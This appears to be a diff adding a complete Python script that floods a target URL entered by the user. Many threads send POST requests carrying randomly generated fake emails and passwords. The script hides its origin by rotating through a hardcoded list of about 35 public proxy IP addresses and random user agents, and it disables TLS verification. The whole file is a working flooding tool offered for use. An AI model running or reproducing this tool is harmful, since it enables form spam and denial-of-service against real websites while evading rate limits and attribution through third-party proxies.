@@ -1,0 +1,212 @@
+import threading
+import requests
+import random
+import string
+import names
+import time
+import logging
+import urllib3
+from fake_useragent import UserAgent
+
+# Suppress only the single InsecureRequestWarning from urllib3 needed for the specific case
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# List of proxies
+proxies_list = [
+    "http://157.159.10.86:80",
+    "http://51.210.223.9:3000",
+    "http://15.236.106.236:3128",
+    "http://13.36.113.81:3128",
+    "http://51.255.0.233:80",
+    "http://51.15.242.202:8888",
+    "http://13.37.73.214:80",
+    "http://51.254.78.223:80",
+    "http://13.36.104.85:80",
+    "http://13.37.59.99:3128",
+    "http://20.111.54.16:80",
+    "http://13.37.59.99:80",
+    "http://13.36.87.105:3128",
+    "http://20.111.54.16:8123",
+    "http://13.38.153.36:80",
+    "http://13.37.73.214:3128",
+    "http://51.210.19.141:80",
+    "http://13.38.176.104:3128",
+    "http://13.37.89.201:80",
+    "http://51.178.142.1:80",
+    "http://72.10.160.90:24101",
+    "http://114.231.45.22:8888",
+    "http://217.52.247.83:1981",
+    "http://190.71.229.42:9992",
+    "http://36.255.84.69:84",
+    "http://72.10.160.173:30291",
+    "http://72.10.164.178:7445",
+    "http://89.218.5.106:37717",
+    "http://72.10.164.178:25579",
+    "http://72.10.160.94:7599",
+    "http://72.10.160.173:11449",
+    "http://47.254.90.125:8081",
+    "http://72.10.160.90:3407",
+    "http://67.43.228.253:25879",
+    "http://36.91.115.133:80",
+]
+
+# Flag to indicate if the process should stop
+stop_threads = False
+
+# Statistics counters
+total_successful_payloads = 0
+total_attempts = 0
+successful_proxies = set()
+
+def get_random_proxy(failed_proxies):
+    """
+    Selects a random proxy from the proxies_list that is not in the failed_proxies set.
+
+    Args:
+    - failed_proxies (set): Set of proxies that have failed.
+
+    Returns:
+    - str: Selected proxy URL.
+    """
+    available_proxies = [proxy for proxy in proxies_list if proxy not in failed_proxies]
+    if not available_proxies:
+        logging.error("All proxies have failed. Exiting.")
+        exit(1)
+    return random.choice(available_proxies)
+
+def name_gen():
+    """
+    Generates a random name based on predefined formats.
+
+    Returns:
+    - str: Generated name.
+    """
+    name_system = random.choice(["FullName", "FullFirstFirstInitial", "FirstInitialFullLast"])
+    first_name = names.get_first_name()
+    last_name = names.get_last_name()
+    if name_system == "FullName":
+        return first_name + last_name
+    elif name_system == "FullFirstFirstInitial":
+        return first_name + last_name[0]
+    return first_name[0] + last_name
+
+def generate_random_email():
+    """
+    Generates a random email address.
+
+    Returns:
+    - str: Generated email address.
+    """
+    name = name_gen()
+    NumberOrNo = random.choice(["Number", "No"])
+    domain = random.choice(["@gmail.com", "@yahoo.com", "@rambler.ru", "@protonmail.com", "@outlook.com", "@itunes.com"])
+    if NumberOrNo == "Number":
+        return name + str(random.randint(1, 100)) + domain
+    else:
+        return name + domain
+
+def generate_random_password():
+    """
+    Generates a random password.
+
+    Returns:
+    - str: Generated password.
+    """
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
+
+def send_posts(url, delay, num_successful_payloads, user_proxy):
+    """
+    Sends POST requests with random payloads to a target URL using proxies.
+
+    Args:
+    - url (str): Target URL to send requests to.
+    - delay (float): Delay between each request (in seconds).
+    - num_successful_payloads (int): Number of successful payloads to send before stopping.
+    - user_proxy (str): Optional user-defined proxy URL to use for requests.
+    """
+    global stop_threads, total_successful_payloads, total_attempts, successful_proxies
+    successful_payloads = 0
+    failed_proxies = set()
+    while successful_payloads < num_successful_payloads and not stop_threads:
+        total_attempts += 1
+        try:
+            email = generate_random_email()
+            password = generate_random_password()
+            data = {"email": email, "password": password}
+            ua = UserAgent()
+            user_agent = ua.random
+            headers = {'User-Agent': user_agent}
+
+            proxy = get_random_proxy(failed_proxies)
+            if user_proxy:
+                proxy = {"http": user_proxy, "https": user_proxy}
+            else:
+                proxy = {"http": proxy, "https": proxy}
+
+            response = requests.post(url, data=data, headers=headers, proxies=proxy, verify=False)
+            if response.status_code == 200:
+                successful_payloads += 1
+                total_successful_payloads += 1
+                successful_proxies.add(proxy["http"])
+                logging.info(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, User-Agent: {user_agent}, Proxy: {proxy}")
+            else:
+                logging.warning(f"Failed to send payload. Status Code: {response.status_code}")
+        except requests.exceptions.ProxyError as e:
+            logging.error(f"Proxy error: {e} - Proxy {proxy} will be excluded.")
+            failed_proxies.add(proxy["http"])
+        except requests.exceptions.SSLError as e:
+            logging.error(f"SSL error: {e} - Ignored due to disabled verification.")
+        except requests.RequestException as e:
+            logging.error(f"Request error: {e}")
+        except Exception as e:
+            logging.error(f"An error occurred: {e}")
+        time.sleep(delay)
+
+def listen_for_stop_command():
+    """
+    Listens for a stop command from the user to terminate all threads.
+    """
+    global stop_threads
+    while True:
+        command = input()
+        if command.strip().lower() == 'stop':
+            stop_threads = True
+            logging.info("Stop command received. Stopping all threads.")
+            break
+
+def main():
+    """
+    Main function to initialize and control the flooding process.
+    """
+    url = input("Enter the URL of the target you want to flood: ")
+    num_threads = int(input("Enter the number of threads: "))
+    delay = float(input("Enter the delay between requests (in seconds): "))
+    num_successful_payloads = int(input("Enter the number of successful payloads per thread: "))
+    user_proxy = input("Enter your proxy (or leave empty to use random proxies): ")
+
+    threads = [threading.Thread(target=send_posts, args=(url, delay, num_successful_payloads, user_proxy), daemon=True) for _ in range(num_threads)]
+    stop_listener_thread = threading.Thread(target=listen_for_stop_command, daemon=True)
+
+    stop_listener_thread.start()
+
+    for t in threads:
+        t.start()
+
+    for t in threads:
+        t.join()
+
+    # After all threads finish, print summary
+    print("\n---- Summary ----")
+    print(f"Total attempts made: {total_attempts}")
+    print(f"Total successful payloads sent: {total_successful_payloads}")
+    print(f"Number of unique proxies successfully used: {len(successful_proxies)}")
+    print("Successful proxies:")
+    for proxy in successful_proxies:
+        print(f"  {proxy}")
+    print("-----------------\n")
+
+if __name__ == "__main__":
+    main()
